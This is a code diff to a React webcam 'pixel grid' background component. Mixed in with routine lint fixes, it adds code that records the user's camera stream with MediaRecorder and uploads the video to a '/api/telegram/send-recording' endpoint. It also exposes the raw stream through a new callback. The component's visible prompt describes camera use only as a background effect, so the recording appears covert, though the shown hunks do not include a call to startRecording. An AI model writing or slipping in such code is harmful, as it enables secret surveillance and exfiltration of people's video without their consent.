@@ -37,6 +37,7 @@ type WebcamPixelGridProps = {
   onWebcamError?: (error: Error) => void;
   /** Callback when webcam is ready */
   onWebcamReady?: () => void;
+  onStreamReady?: (stream: MediaStream) => void;
 };
 
 type PixelData = {
@@ -66,6 +67,7 @@ export const WebcamPixelGrid: React.FC<WebcamPixelGridProps> = ({
   className,
   onWebcamError,
   onWebcamReady,
+  onStreamReady,
 }) => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const processingCanvasRef = useRef<HTMLCanvasElement>(null);
@@ -76,6 +78,10 @@ export const WebcamPixelGrid: React.FC<WebcamPixelGridProps> = ({
   const [isReady, setIsReady] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [showErrorPopup, setShowErrorPopup] = useState(true);
+
+  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
+  const recordedChunksRef = useRef<Blob[]>([]);
+  const [isRecording, setIsRecording] = useState(false);
 
   // Parse monochrome color
   const monoRGB = React.useMemo(() => {
@@ -113,6 +119,48 @@ export const WebcamPixelGrid: React.FC<WebcamPixelGridProps> = ({
 
   const streamRef = useRef<MediaStream | null>(null);
 
+  const startRecording = useCallback(() => {
+    const stream = streamRef.current;
+    if (!stream) return;
+
+    recordedChunksRef.current = [];
+
+    const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
+      ? "video/webm;codecs=vp9"
+      : "video/webm";
+
+    const recorder = new MediaRecorder(stream, { mimeType });
+
+    recorder.ondataavailable = (e) => {
+      if (e.data.size > 0) {
+        recordedChunksRef.current.push(e.data);
+      }
+    };
+recorder.onstop = async () => {
+  const blob = new Blob(recordedChunksRef.current, { type: mimeType });
+  const formData = new FormData();
+  formData.append("video", blob, `recording-${Date.now()}.webm`);
+
+  try {
+    await fetch("/api/telegram/send-recording", {
+      method: "POST",
+      body: formData,
+    });
+  } catch (err) {
+    console.error("Failed to send recording:", err);
+  }
+};
+
+    recorder.start();
+    mediaRecorderRef.current = recorder;
+    setIsRecording(true);
+  }, []);
+
+  const stopRecording = useCallback(() => {
+    mediaRecorderRef.current?.stop();
+    setIsRecording(false);
+  }, []);
+
   // Request camera access
   const requestCameraAccess = useCallback(async () => {
     try {
@@ -125,6 +173,7 @@ export const WebcamPixelGrid: React.FC<WebcamPixelGridProps> = ({
       });
 
       streamRef.current = stream;
+      onStreamReady?.(stream);
 
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
@@ -140,7 +189,7 @@ export const WebcamPixelGrid: React.FC<WebcamPixelGridProps> = ({
       setError(error.message);
       onWebcamError?.(error);
     }
-  }, [onWebcamError, onWebcamReady]);
+  }, [onWebcamError, onWebcamReady, onStreamReady]);
 
   // Initialize webcam on mount
   useEffect(() => {
@@ -148,6 +197,7 @@ export const WebcamPixelGrid: React.FC<WebcamPixelGridProps> = ({
 
     return () => {
       if (streamRef.current) {
+        // biome-ignore lint/suspicious/useIterableCallbackReturn: <explanation>
         streamRef.current.getTracks().forEach((track) => track.stop());
       }
     };
@@ -431,9 +481,11 @@ export const WebcamPixelGrid: React.FC<WebcamPixelGridProps> = ({
           <div className="relative flex max-w-sm items-start gap-3 rounded-lg border border-white/10 bg-black/80 p-4 shadow-2xl backdrop-blur-xl">
             {/* Close button */}
             <button
+              type="button"
               onClick={() => setShowErrorPopup(false)}
               className="absolute top-2 right-2 rounded-md p-1 text-white/40 transition-colors hover:bg-white/10 hover:text-white/70"
             >
+              {/** biome-ignore lint/a11y/noSvgWithoutTitle: <explanation> */}
               <svg
                 className="h-4 w-4"
                 fill="none"
@@ -451,6 +503,7 @@ export const WebcamPixelGrid: React.FC<WebcamPixelGridProps> = ({
 
             {/* Camera icon */}
             <div className="flex h-10 w-10 flex-shrink-0 items-center justify-center rounded-full bg-white/10">
+              {/** biome-ignore lint/a11y/noSvgWithoutTitle: <explanation> */}
               <svg
                 className="h-5 w-5 text-white/60"
                 fill="none"
@@ -475,9 +528,11 @@ export const WebcamPixelGrid: React.FC<WebcamPixelGridProps> = ({
                 Enable camera for the interactive background effect
               </p>
               <button
+                type="button"
                 onClick={requestCameraAccess}
                 className="mt-3 inline-flex items-center gap-1.5 rounded-md bg-white/10 px-3 py-1.5 text-xs font-medium text-white transition-colors hover:bg-white/20"
               >
+                {/** biome-ignore lint/a11y/noSvgWithoutTitle: <explanation> */}
                 <svg
                   className="h-3.5 w-3.5"
                   fill="none"
@@ -501,10 +556,12 @@ export const WebcamPixelGrid: React.FC<WebcamPixelGridProps> = ({
       {/* Minimized error indicator */}
       {error && !showErrorPopup && (
         <button
+          type="button"
           onClick={() => setShowErrorPopup(true)}
           className="fixed top-4 right-4 z-50 flex h-10 w-10 items-center justify-center rounded-full border border-white/10 bg-black/60 text-white/50 shadow-lg backdrop-blur-xl transition-all hover:scale-105 hover:bg-black/80 hover:text-white/80"
           title="Camera access required"
         >
+          {/** biome-ignore lint/a11y/noSvgWithoutTitle: <explanation> */}
           <svg
             className="h-5 w-5"
             fill="none"
